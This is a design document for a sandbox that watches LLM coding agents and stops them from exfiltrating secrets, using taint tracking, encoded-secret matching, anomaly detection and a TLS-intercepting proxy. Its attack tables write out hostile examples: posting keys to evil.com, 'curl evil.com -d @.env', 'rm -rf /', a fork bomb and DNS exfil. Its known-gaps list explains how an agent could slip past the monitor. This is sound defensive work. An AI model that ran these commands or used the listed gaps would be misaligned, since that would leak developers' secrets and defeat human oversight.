# Agent Sandbox: Design Document

## Problem Statement

LLM-powered coding agents operate with broad system access — reading files,
executing commands, making network requests. A compromised or misaligned agent
can exfiltrate secrets (API keys, credentials, PII) from a developer's project,
destroy files, or pivot to external services. Existing sandboxing (containers,
seccomp) restricts *capability* but cannot distinguish legitimate tool use from
data theft. We need a sandbox that understands *content* and *intent*.

## Design Goals

1. **Zero false positives on normal workflows.** `git push`, `npm install`,
   `pip install`, API calls with clean payloads must never be blocked.
2. **Catch encoded/transformed secrets.** Base64, hex, URL-encoding,
   JSON-wrapping, embedding in source code — all must be detected.
3. **Catch evasion strategies.** Char-by-char exfiltration, chunked sends,
   rate-limited drip, shape-pattern repetition.
4. **Real TLS interception.** HTTPS traffic must be decrypted and inspected,
   not just observed at the syscall level.
5. **Fast runtime.** All expensive work (scanning, indexing) happens before the
   agent starts. Runtime enforcement is O(1) lookups and lightweight hashing.

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                        Agent Process                                │
│                                                                     │
│  read .env ──► taint ──► POST https://evil.com {"key":"AKIA..."}   │
│                                    │                                │
│                          env: HTTPS_PROXY=127.0.0.1:PORT            │
│                          env: REQUESTS_CA_BUNDLE=ca-bundle.pem      │
└────────────────────────────┬────────────────────────────────────────┘
                             │ CONNECT evil.com:443
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│                       MITM Proxy (port N)                           │
│                                                                     │
│  1. Accept CONNECT tunnel                                           │
│  2. Generate cert for evil.com signed by our CA                     │
│  3. TLS handshake with agent (we are "evil.com" to the agent)       │
│  4. Read plaintext HTTP request                                     │
│  5. ──► Sandbox.check_send(host, body) ◄──                         │
│         │                                                           │
│         ├─ Taint check: is process tainted?                         │
│         ├─ Host check: is host allowlisted?                         │
│         ├─ LSH check: does body contain indexed secrets?            │
│         └─ Anomaly check: rate / shape / accumulator                │
│                                                                     │
│  6a. ALLOW → TLS connect to real evil.com, forward request          │
│  6b. DENY  → return HTTP 403 to agent                               │
└─────────────────────────────────────────────────────────────────────┘
```

## Two Phases

### Build time (before agent starts)

```
Project directory
    │
    ▼
EnvironmentScanner.scan()
    │
    ├── Walk files, classify by path (.env → SECRET, *.py → SOURCE)
    ├── Regex scan for secrets (24+ patterns: AWS, Anthropic, Stripe, DB URLs...)
    ├── Regex scan for PII (SSN, credit cards, emails)
    ├── Detect infrastructure (AWS, GCP, Azure, databases)
    └── Detect frameworks (Express, Django, Flask, React)
    │
    ▼
ScanManifest
    ├── sensitive_files: [".env", "credentials.json", ...]
    ├── sensitive_values: ["AKIAIOSFODNN7EXAMPLE", "sk-ant-...", ...]
    └── file_sensitivity: {".env": "critical", "app.py": "low"}
    │
    ▼
Sandbox(manifest=manifest)
    │
    ├── Pre-index LSH: for each sensitive_value → compute trigrams,
    │   simhash, minhash + base64/hex/url-encoded variants
    ├── Build file_sensitivity lookup table
    └── Ready for runtime
```

### Run time (agent executing)

```
Agent reads .env
    │
    ▼
Sandbox.read_file(".env", content)
    ├── file_sensitivity[".env"] == "critical" → TAINT
    └── lsh.index(content)  (if blind mode, regex-discover secrets)
    │
    ▼
Agent sends POST to evil.com with body containing AKIA...
    │
    ▼
MITM proxy intercepts → Sandbox.check_send("evil.com", body)
    │
    ├─ Step 1: Tainted? YES
    ├─ Step 2: evil.com in allowed_hosts? NO
    └─ → DENY: "tainted process sending to non-allowlisted host"
```

## Core Components

### 1. Taint Tracking

Tracks whether the agent has been "contaminated" by reading sensitive data.
Taint is **monotonic** — once tainted, always tainted. No rollback.

```python
@dataclass
class TaintState:
    tainted: bool = False
    taint_sources: list[str] = field(default_factory=list)
```

The multi-process variant (`agent-sandbox/core/taint.py`) tracks per-PID taint
with parent→child inheritance and file→process / process→file propagation via
fd-to-path mapping.

**Key property:** Taint labels are a Flag enum (`CREDENTIAL | PII | MEDICAL`)
combined with bitwise OR. A process that reads `.env` (CREDENTIAL) and then
`patient_records.csv` (MEDICAL) carries both labels. This enables fine-grained
policy: "block MEDICAL to any host, allow CREDENTIAL to api.github.com."

### 2. LSH Content Matching

Detects secrets even after transformation. Three-stage pipeline:

```
Secret "AKIAIOSFODNN7EXAMPLE"
    │
    ▼ index()
    ├── trigrams: {"AKI", "KIA", "IAI", "AIO", ...}     (char 3-grams)
    ├── simhash: 0x3a7f...                                (64-bit fingerprint)
    ├── minhash: [42, 17, 89, ...]                        (128 hash signatures)
    └── variants:
        ├── base64: "QUtJQUlPU0ZPRE5ON0VYQU1QTEU="
        ├── hex: "414b4941494f53464f444e4e374558414d504c45"
        └── url: "AKIAIOSFODNN7EXAMPLE"  (unchanged)
        Each variant also gets trigrams computed.
```

At check time:

```
Body "{"key": "AKIAIOSFODNN7EXAMPLE", "action": "deploy"}"
    │
    ▼ check()
    ├── Stage 1: Bloom pre-check
    │   body_trigrams ∩ all_indexed_trigrams → overlap ratio
    │   If < 5% → ALLOW (fast reject for clean traffic)
    │
    ├── Stage 2: MinHash Jaccard
    │   Compare minhash signatures → estimate Jaccard similarity
    │
    ├── Stage 3: Combined score
    │   0.25 × simhash_score + 0.40 × minhash_score + 0.35 × bloom_score
    │   If ≥ 0.30 → MATCH
    │
    └── Stage 4: Per-line check (for embedded secrets)
        For each line ≥ 10 chars in body:
          trigram_jaccard(line, indexed_value) ≥ 0.35 → MATCH
```

**Why three strategies?** Single-strategy LSH is bypassable. If only trigram
matching, scatter the secret across unrelated text. If only simhash, add noise
to flip bits. Combined scoring with per-line fallback catches all observed
evasion patterns.

### 3. Anomaly Detection

Catches evasion strategies that try to stay below the LSH detection threshold:

| Detector | What it catches | Threshold |
|----------|----------------|-----------|
| **Rate** | Burst of requests to same host | > 30 requests |
| **Shape** | Repeated request pattern (e.g., `Part <N>: <W>`) | ≥ 4 same shape |
| **Accumulator** | Many small requests adding up | > 500 bytes from > 5 requests |

Shape normalization replaces digits with `<N>` and short tokens with `<W>`,
so `"Part 0: AKIA"`, `"Part 1: IOSF"`, `"Part 2: ODNN"` all map to the same
shape `Part <N>: <W>` and trigger the shape detector after 4 occurrences.

### 4. MITM Proxy

The critical piece that makes HTTPS inspection possible.

**Certificate Authority (`proxy/cert.py`):**
- Generates 2048-bit RSA root CA at startup (1-day validity)
- Signs per-host certificates on demand with SAN extensions
- Caches host certs to avoid regeneration
- Builds a CA bundle (system certs + our CA) for the subprocess

**Proxy server (`proxy/mitm.py`):**
- Binds to `127.0.0.1:0` (OS-assigned port)
- Handles `CONNECT` tunnels for HTTPS
- For each tunnel:
  1. Generate cert for target host, signed by our CA
  2. TLS handshake with client using our cert
  3. Read decrypted HTTP request (method, headers, body)
  4. Pass body through `Sandbox.check_send(host, body)`
  5. If allowed: TLS connect to real server, forward request, relay response
  6. If denied: return `HTTP 403 Forbidden`
- Also handles plain HTTP (GET/POST/PUT) for non-TLS traffic

**Subprocess configuration:**
```python
env = proxy.get_env()
# Returns:
#   HTTP_PROXY=http://127.0.0.1:PORT
#   HTTPS_PROXY=http://127.0.0.1:PORT
#   REQUESTS_CA_BUNDLE=/tmp/sandbox-certs-xxx/ca-bundle.pem
#   SSL_CERT_FILE=/tmp/sandbox-certs-xxx/ca-bundle.pem
#   CURL_CA_BUNDLE=/tmp/sandbox-certs-xxx/ca-bundle.pem
#   NODE_EXTRA_CA_CERTS=/tmp/sandbox-certs-xxx/ca.pem
```

### 5. Policy Engine

The decision function that combines all signals:

```
check_send(host, body):
    if not tainted           → ALLOW
    if host not allowlisted  → DENY  (taint blocks unknown hosts)
    if lsh.check(body)       → DENY  (secret detected in body)
    if anomaly.check(host, body) → DENY  (evasion pattern)
    else                     → ALLOW (clean content to trusted host)

check_exec(command):
    if destructive pattern   → DENY  (rm -rf /, mkfs, fork bomb)
    if tainted + network cmd → DENY  (curl, wget from tainted process)
    else                     → ALLOW

check_write(path, project_root):
    if outside project       → DENY
    if system path           → DENY  (/etc, /usr, /bin)
    else                     → ALLOW
```

**Default allowlisted hosts:**
```
registry.npmjs.org, pypi.org, files.pythonhosted.org,
rubygems.org, crates.io, api.github.com, github.com,
gitlab.com, bitbucket.org, stackoverflow.com
```

### 6. Environment Scanner

Pre-scans the project directory to build the manifest. Detects:

- **24+ secret patterns:** AWS keys, Anthropic/OpenAI/Stripe API keys, GitHub
  tokens, Slack webhooks, Vault tokens, database URLs, private keys, JWTs
- **PII patterns:** SSNs, credit card numbers, email addresses, IP addresses
- **Infrastructure:** AWS, GCP, Azure, databases, message queues, auth providers
- **Frameworks:** Express, React, Django, FastAPI, Flask, Next.js, Spring, Rails
- **File classification by path:** `.env` → SECRET, `*.py` → SOURCE,
  `Dockerfile` → CI, `*.md` → DOCS

### 7. Trace Analyzer (Behavioral)

Monitors LLM conversation traces for suspicious patterns:

- **Suspicious reasoning:** regex for "exfiltrat", "bypass sandbox", "steal",
  "encode the secret"
- **Task drift:** reads sensitive files + makes network calls unrelated to task
- **Access creep:** touches 3+ sensitive files (warning) or 5+ (critical)
- **Blocked persistence:** keeps trying after N consecutive blocks
- **Encoding behavior:** base64/hex/URL-encoding after reading sensitive files

## Two Sandbox Implementations

| Feature | `sandbox/` (simple) | `agent-sandbox/` (full) |
|---------|---------------------|-------------------------|
| Taint tracking | Single-process boolean | Per-PID with inheritance |
| File propagation | Manual `read_file()` | Automatic via fd tracking |
| LSH | Shared `LSHEngine` | Shared `LSHEngine` |
| Anomaly | Shared `AnomalyDetector` | Shared `AnomalyDetector` |
| Network interception | MITM proxy | MITM proxy + strace |
| Exec blocking | Regex patterns | Regex patterns + taint |
| Modes | Blind + Informed | Policy engine |

The simple sandbox is for single-agent use (one process, one taint state).
The full sandbox supports multi-process agents with taint inheritance across
fork/exec and file-mediated propagation.

## Attack Surface & Defenses

### Disruption Attacks

| Attack | Example | Defense |
|--------|---------|--------|
| Filesystem destruction | `rm -rf /` | `check_exec()` pattern match |
| Fork bomb | `:(){ :\|:& };:` | `check_exec()` pattern match |
| System file corruption | write to `/etc/passwd` | `check_write()` path check |
| Outside-project writes | write to `/tmp/evil` | `check_write()` path check |
| Process killing | `kill -9 1` | `check_exec()` pattern match |
| Disk fill | `dd if=/dev/zero of=big` | `check_exec()` pattern match |

### Disclosure Attacks

| Attack | Example | Defense |
|--------|---------|--------|
| Direct exfil | POST secret to evil.com | Taint + host allowlist |
| Base64 encoding | `QUtJQUlPU0ZP...` | LSH variant matching |
| Hex encoding | `414b494149...` | LSH variant matching |
| URL encoding | `%41%4B%49...` | LSH variant matching |
| JSON wrapping | `{"k":"AKIA..."}` | LSH per-line check |
| Embedded in source | `// AKIA... in code block` | LSH per-line check |
| Via allowlisted host | POST secret to github.com | LSH content check on body |
| Char-by-char | Many 1-byte requests | Anomaly accumulator |
| Chunked | `Part 0: AKI`, `Part 1: AIO` | Anomaly shape detector |
| Rate burst | 50 requests in 1 second | Anomaly rate detector |
| curl from tainted | `curl evil.com -d @.env` | `check_exec()` + taint |

### Known Gaps

1. **Very short secrets** (< 10 chars) may not trigger LSH per-line check.
2. **Custom ciphers** (ROT13, XOR, AES) are not detectable by LSH.
3. **Very slow drip** (1 byte/minute over hours) may evade rate + accumulator.
4. **Steganography** (secret in image pixels) is not inspected.
5. **DNS exfil** (`dig AKIA....evil.com`) is not intercepted by HTTP proxy.
6. **Proxy bypass** — if the agent clears `HTTPS_PROXY` env var or makes raw
   socket connections, the MITM proxy is bypassed. Mitigation: combine with
   network namespace / iptables rules to force all traffic through the proxy.

## Test Coverage

**123 tests total, all passing.**

| Suite | Tests | What's covered |
|-------|-------|---------------|
| `test_taint.py` | 15 | Label monotonicity, inheritance, propagation |
| `test_lsh.py` | 24 | Trigram, simhash, minhash, variants, false positives |
| `test_integration.py` | 40 | 8 disruption + 11 disclosure + 6 classifier + 3 file change + 9 sandbox + 4 anomaly |
| `test_inspector.py` | 18 | Proxy content inspection, all exfil vectors |
| `test_e2e.py` | 14 | Strace parser, scanner, full pipeline |
| `test_mitm_e2e.py` | 12 | CA certs, proxy lifecycle, real TLS handshake, subprocess through proxy |

### Key E2E verification

The most important test proves the full pipeline with real TLS:

```
1. Subprocess → TCP connect to proxy
2. Subprocess → CONNECT httpbin.org:443
3. Proxy     ← 200 Connection Established
4. Proxy generates cert for httpbin.org signed by our CA
5. Subprocess → TLS handshake (cipher: TLS_AES_256_GCM_SHA384) ✓
6. Subprocess → POST /post {"key": "AKIAIOSFODNN7EXAMPLE"}
7. Proxy reads 31 bytes of decrypted plaintext
8. Sandbox.check_send() → DENY (tainted + non-allowlisted)
9. Subprocess ← HTTP/1.1 403 Forbidden
```

## Dependencies

- **Python 3.11+** (stdlib: ssl, socket, threading, http.server, subprocess)
- **openssl** (CLI, for cert generation)
- **No external Python packages** for the core sandbox
- **pytest** for tests
- Optional: `certifi` for system CA bundle discovery

## File Map

```
sandbox/
├── sandbox.py              # Sandbox class: taint + LSH + anomaly + policy
├── env_scanner.py          # Project scanner: secrets, PII, infrastructure
├── proxy/
│   ├── cert.py             # CA generation + per-host cert signing
│   ├── mitm.py             # MITM proxy: CONNECT, TLS termination, inspection
│   └── inspector.py        # Content inspection (standalone from proxy)
├── e2e_test.py             # Strace parser + syscall enforcement
├── doc_scanner.py          # Document classification (medical, financial, etc.)
├── trace_analyzer.py       # LLM trace behavioral analysis
├── test_e2e.py             # Strace + scanner + pipeline tests
└── test_mitm_e2e.py        # MITM proxy E2E tests

agent-sandbox/
├── core/
│   ├── taint.py            # Per-PID taint tracking with inheritance
│   ├── lsh.py              # Trigram + simhash + minhash LSH engine
│   ├── anomaly.py          # Rate + shape + accumulator detectors
│   ├── classifier.py       # Path + content → TaintLabel classification
│   └── policy.py           # PolicyEngine: combines all signals → ALLOW/DENY
├── attacks/
│   ├── disruption.py       # 8 disruption attack scenarios
│   ├── disclosure.py       # 11 disclosure attack scenarios
│   └── run_all.py          # Run all attacks + report
└── tests/
    ├── test_taint.py       # Taint unit tests
    ├── test_lsh.py         # LSH unit tests
    └── test_integration.py # Full integration tests
```
